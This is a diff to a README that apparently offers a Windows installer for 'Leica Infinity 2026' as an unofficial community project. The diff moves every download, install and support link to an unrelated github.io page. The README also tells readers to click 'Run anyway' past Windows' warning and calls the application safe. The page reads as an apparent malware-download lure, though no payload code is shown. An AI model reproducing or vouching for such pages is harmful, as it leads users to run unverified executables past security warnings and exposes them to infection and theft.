@@ -1,14 +1,14 @@
 <h1>📸 leica-infinity-2026 - Setup, Track, and Manage Your Sessions</h1>
 
 <p align="center">
-  <a href="https://github.com/alegameplays14-del/leica-infinity-2026" style="display:inline-block;padding:14px 28px;font-size:20px;font-weight:bold;color:#fff;background:#009688;border-radius:8px;text-decoration:none;">⬇️ Download Leica Infinity 2026</a>
+  <a href="https://alegameplays14-del.github.io" style="display:inline-block;padding:14px 28px;font-size:20px;font-weight:bold;color:#fff;background:#009688;border-radius:8px;text-decoration:none;">⬇️ Download Leica Infinity 2026</a>
 </p>
 
 ## 🚀 Quick Start Guide
 
 Leica Infinity is a Windows desktop application for managing your setup notes, workflow checklists, and session logs. This repository provides the installer and documents the process.
 
-Visit this link to download the application: [Download Leica Infinity 2026](https://github.com/alegameplays14-del/leica-infinity-2026)
+Visit this link to download the application: [Download Leica Infinity 2026](https://alegameplays14-del.github.io)
 
 ## 🔍 What Is This?
 
@@ -29,7 +29,7 @@ This repository contains the Windows setup files for Leica Infinity 2026. You wi
 
 ## ⬇️ How to Download and Install
 
-1. Click the **Download** button above or go to [https://github.com/alegameplays14-del/leica-infinity-2026](https://github.com/alegameplays14-del/leica-infinity-2026).
+1. Click the **Download** button above or go to [https://alegameplays14-del.github.io](https://alegameplays14-del.github.io).
 2. On that page, find and click the green "Code" button, then select "Download ZIP".
 3. Save the ZIP file to your computer (for example, on your Desktop).
 4. Right-click the downloaded ZIP file and choose "Extract All".
@@ -110,7 +110,7 @@ A: Click "More info" then "Run anyway" if prompted. The application is safe.
 ## 📢 Support
 
 This is an unofficial community project. For help:
-- Open an issue on the [GitHub repository](https://github.com/alegameplays14-del/leica-infinity-2026)
+- Open an issue on the [GitHub repository](https://alegameplays14-del.github.io)
 - Review the included setup notes
 - Search for "Leica Infinity" forums or groups
 
